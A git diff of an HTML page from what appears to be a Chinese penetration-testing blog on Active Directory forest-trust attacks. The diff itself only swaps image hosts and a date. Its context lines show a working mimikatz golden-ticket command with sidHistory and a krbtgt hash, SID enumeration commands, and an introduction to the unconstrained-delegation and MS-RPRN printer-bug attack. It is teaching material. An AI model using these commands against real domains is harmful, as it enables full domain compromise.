@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-22
+                    2021-11-22
                 </div>
                 
 
@@ -517,7 +517,7 @@
 <p>使用 dir 访问目标域控</p>
 <pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211307519.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110211307519.png"></p>
 <h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
 <p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
 <pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -528,7 +528,7 @@
 <p>在子域普通用户权限的计算机中构造黄金票据</p>
 <pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211315739.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110211315739.png"></p>
 <h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p>
 <p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p>
 <p>首先在 teamssix.com 的域控上监听身份认证请求</p>
@@ -553,7 +553,7 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -705,7 +705,7 @@
                 <a href="/211027-163641.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png" class="responsive-img" alt="【建议收藏】内网学习笔记合集">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210907113159.png" class="responsive-img" alt="【建议收藏】内网学习笔记合集">
                         
                         <span class="card-title">【建议收藏】内网学习笔记合集</span>
                     </div>
@@ -761,7 +761,7 @@
                 <a href="/211009-145524.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png" class="responsive-img" alt="【内网学习笔记】29、白银票据">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】29、白银票据">
                         
                         <span class="card-title">【内网学习笔记】29、白银票据</span>
                     </div>
